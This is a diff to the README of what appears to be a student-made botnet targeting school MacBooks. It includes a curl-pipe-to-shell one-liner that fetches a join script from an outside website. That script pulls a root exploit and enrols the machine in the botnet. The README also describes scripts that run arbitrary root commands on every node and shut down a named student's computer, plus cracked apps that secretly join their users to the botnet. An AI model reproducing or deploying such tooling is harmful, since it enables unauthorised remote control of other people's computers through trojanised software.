@@ -12,20 +12,14 @@ The botnet is controlled by a simple Python script which opens a socket on port 
 ### Joining
 Two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, run it, bla bla bla. Just run this script and you'll be good.
 
-Here's a simple one-liner to join the botnet (all the scripts are up on my website for simplicity of URLs):
+Here's a simple one-liner to join the botnet (all the scripts are up on my website for URL simplicity):
 
 ```sh
-curl https://erikboesen.com/join.sh | bash
-```
-
-or if you like simple URLs:
-
-```sh
-curl -L erikboesen.com/join.sh | bash
+curl -L erikboesen.com/join.sh |sh
 ```
 
 ### Controlling
-Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online.
+Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online. `die.sh` will kill open applications, turn off the screen, and initiate shutdown on the computer owned by the student with the provided username. Note: Don't do this.  
 
 ### Apps
 The `apps` directory contains some cracked versions of various applications which are blocked on our MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.
